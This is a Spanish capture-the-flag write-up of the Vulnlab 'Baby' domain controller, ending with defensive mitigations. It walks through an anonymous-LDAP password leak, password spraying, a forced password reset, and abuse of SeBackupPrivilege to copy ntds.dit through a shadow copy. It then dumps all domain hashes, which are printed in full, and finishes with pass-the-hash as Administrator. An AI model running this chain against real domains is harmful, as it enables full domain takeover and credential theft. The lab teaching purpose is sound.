---
title: "Baby"
description: "Writeup de Baby - Vulnlab - Dificultad: Easy. LDAP anonymous bind + SeBackupPrivilege + NTDS dump vía VSS."
sidebar:
  badge:
    text: Easy
    variant: success
---

{/*
Tags sugeridos (descomenta y añade `tags` al schema en src/content.config.ts si quieres usarlos):
  - vulnlab
  - windows
  - easy
  - active-directory
  - ldap-anonymous
  - sebackupprivilege
  - ntds-dump
  - vss-shadow-copy
  - pass-the-hash
*/}

# 🖥️ Baby

> 📅 Fecha: 2026-06-02
> 🎯 Plataforma: Vulnlab *(el enlace original apuntaba a HTB, pero el dominio `baby.vl` y los 450 puntos corresponden a Vulnlab — confirmar)*
> ⚙️ SO: Windows Server 2022 (Build 20348)
> 🎚️ Dificultad: Easy
> 🏆 Puntos: 450
> ⏱️ Tiempo estimado: 3h 30m
> 🌐 IP: `10.129.6.218`
> 👤 Autor: warrior866

---

## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [Enumeración](#-enumeración)
- [Explotación Inicial (Foothold)](#-explotación-inicial-foothold)
- [Escalada de Privilegios](#-escalada-de-privilegios)
- [Flags](#-flags)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)

---

## 📝 Resumen Ejecutivo

Baby es un Domain Controller Windows Server 2022 cuya superficie de ataque inicial es un **bind anónimo a LDAP** que filtra una contraseña inicial (`BabyStart123!`) en el campo `description` de la usuaria `Teresa.Bell`. Esa contraseña resulta ser la contraseña inicial por defecto del dominio y es reutilizada por otra usuaria, **Caroline.Robinson**, que pertenece al grupo `Backup Operators` y `Remote Management Users`. Tras forzar el cambio de contraseña obligatorio vía SAMR y conectar por WinRM, se abusa de **`SeBackupPrivilege`** para crear una **shadow copy con `diskshadow`**, copiar `ntds.dit` + `SYSTEM` con `robocopy /b`, y volcar offline el hash NT del Administrador del dominio. Finalmente, se hace **pass-the-hash** con `evil-winrm` para obtener `root.txt`.

| Campo | Valor |
|-------|-------|
| Puntos débiles | LDAP anonymous bind, password en `description`, password reuse, `SeBackupPrivilege` |
| CVEs | N/A (misconfiguración, no CVE) |
| Herramientas | `nmap`, `ldapsearch`, `nxc` (NetExec), `impacket-changepasswd`, `evil-winrm`, `diskshadow`, `robocopy`, `impacket-secretsdump` |
| Tiempo total | ~3h 30m |

---

## 🔍 Reconocimiento

### Escaneo de puertos (nmap)

Escaneo completo con detección de servicios, scripts por defecto y OS fingerprinting:

```bash
nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn -oN nmap.txt 10.129.6.218
```

**Salida real:**

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-02 11:26 -0400
Nmap scan report for 10.129.6.214
Host is up (0.16s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-02 15:28:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-02T15:29:35+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
[...]
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
Nmap done: 1 IP address (1 host up) scanned in 216.42 seconds
```

> ⚠️ **Inconsistencia detectada:** la salida reporta `10.129.6.214` pero el resto del writeup usa `10.129.6.218`. Probablemente la IP de la máquina cambió entre escaneos (típico en HTB/Vulnlab al re-spawnear).

> 💡 **Análisis:** la combinación de puertos `53/88/135/389/445/464/636/3268/3389/5985/9389` es la huella clásica de un **Domain Controller Windows**. El nombre NetBIOS es `BABYDC`, el dominio FQDN es `baby.vl`, el SO es Windows Server 2022 (Build 20348). Puntos a explotar:
> - **LDAP (389/636/3268)** → enumeración de usuarios, posible anonymous bind.
> - **SMB (445)** con signing requerido → no hay relay posible, pero sí auth.
> - **WinRM (5985)** → si conseguimos credenciales, shell remota directa.
> - **Kerberos (88)** → AS-REP roasting / Kerberoasting si hay usuarios vulnerables.

### Resolución DNS local

Agrego el dominio al `/etc/hosts` para que herramientas que requieren FQDN (Kerberos, LDAP con SASL) funcionen correctamente:

```bash
echo "10.129.6.218 baby.vl BabyDC.baby.vl" | sudo tee -a /etc/hosts
```

```text
[sudo] password for warrior:
10.129.6.218 baby.vl BabyDC.baby.vl
```

### Configuración de Kerberos

Configuración mínima de `/etc/krb5.conf` para poder pedir TGT/TGS al KDC del dominio:

```bash
sudo bash -c 'cat > /etc/krb5.conf << EOF
[libdefaults]
    default_realm = BABY.VL
    dns_lookup_realm = false
    dns_lookup_kdc = false
[realms]
    BABY.VL = {
        kdc = 10.129.6.218
        admin_server = 10.129.6.218
    }
[domain_realm]
    .baby.vl = BABY.VL
    baby.vl = BABY.VL
EOF'
```

> 💡 **Análisis:** aunque finalmente la solución no requirió Kerberos (usamos NTLM por SMB/WinRM), tener el realm configurado es buena práctica al pentestear AD por si necesitamos `getTGT.py`, `getNPUsers.py` o pivotes Kerberos.

---

## 🗂️ Enumeración

### LDAP — Bind anónimo (vector clave)

Pruebo si el DC permite bind anónimo (`-D '' -w ''`) y consulto todos los objetos `user` pidiendo `sAMAccountName` y `description`:

```bash
ldapsearch -x -H ldap://10.129.6.218 -D '' -w '' -b "dc=baby,dc=vl" "(objectClass=user)" sAMAccountName description
```

**Salida real (recortada a lo relevante):**

```text
# extended LDIF
# LDAPv3
# base <dc=baby,dc=vl> with scope subtree
# filter: (objectClass=user)
# requesting: sAMAccountName description

# Guest, Users, baby.vl
dn: CN=Guest,CN=Users,DC=baby,DC=vl
description: Built-in account for guest access to the computer/domain
sAMAccountName: Guest

# Jacqueline Barnett, dev, baby.vl
sAMAccountName: Jacqueline.Barnett
# Ashley Webb, dev, baby.vl
sAMAccountName: Ashley.Webb
# Hugh George, dev, baby.vl
sAMAccountName: Hugh.George
# Leonard Dyer, dev, baby.vl
sAMAccountName: Leonard.Dyer
# Connor Wilkinson, it, baby.vl
sAMAccountName: Connor.Wilkinson
# Joseph Hughes, it, baby.vl
sAMAccountName: Joseph.Hughes
# Kerry Wilson, it, baby.vl
sAMAccountName: Kerry.Wilson

# Teresa Bell, it, baby.vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
description: Set initial password to BabyStart123!
sAMAccountName: Teresa.Bell

# search result
result: 0 Success
# numResponses: 13
# numEntries: 9
```

> 💡 **Análisis crítico:** ¡el DC permite **anonymous bind a LDAP** y, sobre todo, la descripción de `Teresa.Bell` filtra literalmente una contraseña: `BabyStart123!`! Es un error clásico de admins que ponen la contraseña inicial en el atributo `description` (visible para cualquier `Authenticated User`, e incluso anónimo aquí). Hay que probar esa contraseña contra todos los usuarios — muy probable que sea la contraseña inicial **por defecto** del dominio.

### LDAP — El mismo enum con NetExec (más cómodo)

```bash
nxc ldap 10.129.6.218 -u '' -p '' -M get-desc-users
```

```text
LDAP        10.129.6.214    389    BABYDC    [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.6.214    389    BABYDC    [+] baby.vl\:
GET-DESC... 10.129.6.214    389    BABYDC    [+] Found following users:
GET-DESC... 10.129.6.214    389    BABYDC    User: Guest description: Built-in account for guest access to the computer/domain
GET-DESC... 10.129.6.214    389    BABYDC    User: Teresa.Bell description: Set initial password to BabyStart123!
```

> 💡 **Análisis:** confirma el hallazgo. El módulo `get-desc-users` de NetExec automatiza exactamente este patrón.

### LDAP — Enumeración completa de objetos

Listo todos los objetos del dominio para descubrir usuarios que no aparecieron en el primer filtro (el bind anónimo limita ciertos atributos, no todos los objetos):

```bash
nxc ldap BabyDC.baby.vl -u '' -p '' --query "(objectClass=*)" "" | grep Response
```

```text
LDAP    10.129.6.218    389    BABYDC    [+] Response for object: DC=baby,DC=vl
LDAP    10.129.6.218    389    BABYDC    [+] Response for object: CN=Administrator,CN=Users,DC=baby,DC=vl
LDAP    10.129.6.218    389    BABYDC    [+] Response for object: CN=Guest,CN=Users,DC=baby,DC=vl
LDAP    10.129.6.218    389    BABYDC    [+] Response for object: CN=krbtgt,CN=Users,DC=baby,DC=vl
[...]
LDAP    10.129.6.218    389    BABYDC    [+] Response for object: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
LDAP    10.129.6.218    389    BABYDC    [+] Response for object: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
LDAP    10.129.6.218    389    BABYDC    [+] Response for object: CN=Hugh George,OU=dev,DC=baby,DC=vl
LDAP    10.129.6.218    389    BABYDC    [+] Response for object: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
LDAP    10.129.6.218    389    BABYDC    [+] Response for object: CN=Ian Walker,OU=dev,DC=baby,DC=vl
LDAP    10.129.6.218    389    BABYDC    [+] Response for object: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
LDAP    10.129.6.218    389    BABYDC    [+] Response for object: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
LDAP    10.129.6.218    389    BABYDC    [+] Response for object: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
LDAP    10.129.6.218    389    BABYDC    [+] Response for object: CN=Teresa Bell,OU=it,DC=baby,DC=vl
LDAP    10.129.6.218    389    BABYDC    [+] Response for object: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```

> 💡 **Análisis:** aparecen **dos usuarios nuevos** que el bind anónimo restrictivo no había mostrado: `Ian.Walker` (OU=dev) y, lo más importante, **`Caroline.Robinson` (OU=it)**. Lista final de candidatos a password-spray con `BabyStart123!`: todos los usuarios de las OUs `dev` e `it`.

---

## 🚪 Explotación Inicial (Foothold)

### Password spray con la credencial filtrada

```bash
nxc smb 10.129.6.218 -u 'Caroline.Robinson' -p 'BabyStart123!'
```

```text
SMB    10.129.6.218    445    BABYDC    [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB    10.129.6.218    445    BABYDC    [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

> 💡 **Análisis:** `STATUS_PASSWORD_MUST_CHANGE` no es un fallo. Significa que **la contraseña es correcta**, pero el usuario tiene activada la flag `User must change password at next logon`. Es exactamente coherente con el texto de Teresa: *"Set initial password to..."*. Solución: forzar el cambio de contraseña via SAMR antes de poder autenticar normalmente.

### Forzado del cambio de contraseña (SAMR)

```bash
impacket-changepasswd baby.vl/Caroline.Robinson:'BabyStart123!'@10.129.6.218 -newpass 'Password123!' -protocol smb-samr
```

```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
[*] Changing the password of baby.vl\Caroline.Robinson
[*] Connecting to DCE/RPC as baby.vl\Caroline.Robinson
[!] Password is expired or must be changed, trying to bind with a null session.
[*] Connecting to DCE/RPC as null session
[*] Password was changed successfully.
```

> 💡 **Análisis:** `impacket-changepasswd` con `-protocol smb-samr` cae a null-session cuando detecta `STATUS_PASSWORD_MUST_CHANGE` y completa el cambio. Ahora `Caroline.Robinson:Password123!` es una credencial válida y operativa.

### Acceso por WinRM

```bash
evil-winrm -i 10.129.6.218 -u 'Caroline.Robinson' -p 'Password123!'
```

```text
Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> cat user.txt
[user flag]
```

> 💡 **Análisis:** acceso por WinRM funciona porque Caroline pertenece a `Remote Management Users`. Flag de usuario obtenida.

---

## 🚀 Escalada de Privilegios

### Enumeración post-explotación: privilegios del usuario

```powershell
whoami /all
```

```text
USER INFORMATION
----------------
User Name              SID
====================== ==============================================
baby\caroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1115

GROUP INFORMATION
-----------------
Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BABY\it                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group
[...]

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

> 💡 **Análisis:** Caroline es miembro de **`BUILTIN\Backup Operators`** y tiene **`SeBackupPrivilege` + `SeRestorePrivilege` habilitados**. En un Domain Controller esto es equivalente a Domain Admin: con `SeBackupPrivilege` puedo abrir cualquier archivo del sistema saltándome ACLs, incluyendo `C:\Windows\NTDS\ntds.dit` (la base de datos de Active Directory que contiene **todos los hashes del dominio**) y `HKLM\SYSTEM` (necesario para descifrarla).
>
> El problema: `ntds.dit` está **bloqueado por el proceso `lsass`** mientras el DC está corriendo, así que no se puede copiar directamente con `copy`. Solución: crear una **Volume Shadow Copy** y copiar desde ahí con `robocopy /b` (que respeta el privilegio de backup).

### Vector de escalada: `SeBackupPrivilege` → dump de NTDS via VSS

#### Paso 1 — Volcar hives SAM y SYSTEM

```powershell
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive
dir C:\Temp\
```

```text
    Directory: C:\Temp

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          6/2/2026   4:52 PM          49152 sam.hive
-a----          6/2/2026   4:52 PM       20480000 system.hive
```

> ⚠️ **TODO:** falta documentar la salida real de los dos `reg save`. Si la tienes anotada, péga­la para reemplazar esta nota.

#### Paso 2 — Descargar SAM + SYSTEM y probar el dump LOCAL

```bash
# Desde la sesión de evil-winrm
download sam.hive sam.hive
download system.hive system.hive
```

```text
Info: Downloading C:\Temp\sam.hive to sam.hive
Info: Download successful!

Info: Downloading C:\Temp\system.hive to system.hive
Info: Download successful!
```

Volcado local (esto **solo da los hashes de cuentas locales del DC**, no los del dominio):

```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

> 💡 **Análisis:** el hash `8d992faed38128ae85e95fa35868bb43` es el del **Administrator local del DC**, NO el del Administrator del dominio. En un DC promovido el SAM local queda vacío de cuentas útiles (las cuentas viven en NTDS). Necesitamos `ntds.dit`. Vamos a por él con VSS.

#### Paso 3 — Crear una Volume Shadow Copy con `diskshadow`

Construyo el script en el DC línea a línea (`evil-winrm` no soporta `here-docs` cómodamente):

```powershell
cmd.exe /c "echo set verbose on> C:\Temp\vss.txt"
cmd.exe /c "echo set metadata C:\Windows\Temp\meta.cab>> C:\Temp\vss.txt"
cmd.exe /c "echo set context persistent nowriters>> C:\Temp\vss.txt"
cmd.exe /c "echo add volume C: alias cdrive>> C:\Temp\vss.txt"
cmd.exe /c "echo create>> C:\Temp\vss.txt"
cmd.exe /c "echo expose %cdrive% E:>> C:\Temp\vss.txt"
```

Verifico contenido del script:

```powershell
cmd.exe /c "type C:\Temp\vss.txt"
```

```text
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context persistent nowriters
add volume C: alias cdrive
create
expose %cdrive% E:
```

Ejecuto diskshadow con el script:

```powershell
cmd.exe /c "diskshadow /s C:\Temp\vss.txt"
```

```text
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  6/2/2026 7:05:26 PM

-> set verbose on
-> set metadata C:\Windows\Temp\meta.cab
-> set context persistent nowriters
-> add volume C: alias cdrive
-> create
Alias cdrive for shadow ID {6209086a-aeda-4c72-a8bc-b26cef049a4c} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {db07ea75-0fe1-4e65-86e5-4671d24c086d} set as environment variable.
Inserted file Manifest.xml into .cab file meta.cab
Inserted file Dis8C2B.tmp into .cab file meta.cab
Querying all shadow copies with the shadow copy set ID {db07ea75-0fe1-4e65-86e5-4671d24c086d}
        * Shadow copy ID = {6209086a-aeda-4c72-a8bc-b26cef049a4c}               %cdrive%
                - Shadow copy set: {db07ea75-0fe1-4e65-86e5-4671d24c086d}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{711fc68a-0000-0000-0000-100000000000}\ [C:\]
                - Creation time: 6/2/2026 7:05:27 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3
                - Originating machine: BabyDC.baby.vl
                - Service machine: BabyDC.baby.vl
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential
Number of shadow copies listed: 1
-> expose %cdrive% E:
-> %cdrive% = {6209086a-aeda-4c72-a8bc-b26cef049a4c}
The shadow copy was successfully exposed as E:\.
```

> 💡 **Análisis:** la shadow copy del volumen `C:` queda montada como `E:\`. En esa "foto" del disco, `ntds.dit` ya no está bloqueado por `lsass` y se puede copiar libremente.

#### Paso 4 — Copiar `ntds.dit` con `robocopy /b`

El flag `/b` indica modo **Backup Mode**: usa `SeBackupPrivilege` para saltarse ACLs durante la copia.

```powershell
cmd.exe /c "robocopy /b E:\Windows\NTDS C:\Temp ntds.dit"
```

```text
-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------
  Started : Tuesday, June 2, 2026 7:05:55 PM
   Source : E:\Windows\NTDS\
     Dest : C:\Temp\
    Files : ntds.dit
  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
------------------------------------------------------------------------------
                           1    E:\Windows\NTDS\
            New File              16.0 m        ntds.dit
[...]
100%
------------------------------------------------------------------------------
               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Speed :           51,150,048 Bytes/sec.
```

#### Paso 5 — Descargar `ntds.dit` al atacante

```bash
# Desde evil-winrm
cd C:\Temp
download ntds.dit
```

```text
Info: Downloading C:\Temp\ntds.dit to ntds.dit
Info: Download successful!
```

#### Paso 6 — Dump offline con `secretsdump`

Combino `ntds.dit` con `system.hive` (el bootkey está en SYSTEM) para descifrar los hashes del dominio:

```bash
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:5fa67a134024d41bb4ff8bfd7da5e2b5:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
[...]
krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97
[...]
[*] Cleaning up...
```

> 💡 **Análisis:** ya tenemos el NT hash del **Administrator del dominio**: `ee4457ae59f1e3fbd764e33d9cef123d`. También tenemos el hash de `krbtgt`, lo que abre la puerta a **Golden Tickets** persistentes si quisiéramos. Para flag → pass-the-hash.

### Pass-the-Hash como Administrator

```bash
evil-winrm -i 10.129.6.218 -u 'Administrator' -H 'ee4457ae59f1e3fbd764e33d9cef123d'
```

```text
Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
[root flag]
```

---



## 🎓 Lecciones Aprendidas

- **LDAP anonymous bind + `description`**: nunca poner contraseñas en atributos del directorio. El campo `description` (y `info`, `comment`) es legible por cualquier usuario autenticado por defecto, y aquí lo era incluso por anónimos. Buscar siempre con `nxc ldap -M get-desc-users` y `get-userdescription`.
- **`STATUS_PASSWORD_MUST_CHANGE` ≠ credencial incorrecta**: confunde a muchos. Es una validación exitosa con la flag de cambio pendiente. `impacket-changepasswd -protocol smb-samr` lo resuelve incluso vía null session.
- **`SeBackupPrivilege` en un DC = Domain Admin**: cualquier miembro de `Backup Operators` puede volcar NTDS via VSS + `robocopy /b`. Es equivalente a tener DA, pero queda fuera del grupo `Domain Admins` y suele escapar a las auditorías superficiales.
- **Receta `diskshadow` + `robocopy /b`**: aprenderse esta combo de memoria. Es la forma más limpia de exfiltrar `ntds.dit` sin tocar `lsass` ni levantar alertas de Mimikatz/Defender.

### Mitigaciones (lado defensivo)
1. Deshabilitar **anonymous bind** a LDAP en el DC (`dsHeuristics` / política `Pre-Windows 2000 Compatible Access`).
2. Auditar y limpiar el atributo `description` de todos los usuarios del dominio (PowerShell: `Get-ADUser -Filter * -Properties Description | Where-Object {$_.Description -match "pass|pwd|key"}`).
3. Política de contraseñas iniciales: usar contraseñas aleatorias por usuario, comunicadas fuera de banda, **no** una contraseña común "por defecto".
4. Restringir membresía de **`Backup Operators`** en DCs — debería estar vacío salvo cuentas de servicio de backup específicas con MFA/PAW.
5. Monitorizar creación de Shadow Copies (eventos 8224 del proveedor VSS) y ejecución de `diskshadow.exe` fuera de ventanas de mantenimiento.

---

## 📚 Referencias

- [HackTricks - LDAP anonymous bind](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)
- [HackTricks - SeBackupPrivilege abuse](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sebackupprivilege)
- [HackTricks - Dumping NTDS.dit](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync#dumping-ntds.dit)
- [NetExec - LDAP module `get-desc-users`](https://www.netexec.wiki/ldap-protocol/get-desc-users)
- [Impacket - `secretsdump.py` & `changepasswd.py`](https://github.com/fortra/impacket)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [Microsoft Docs - diskshadow](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)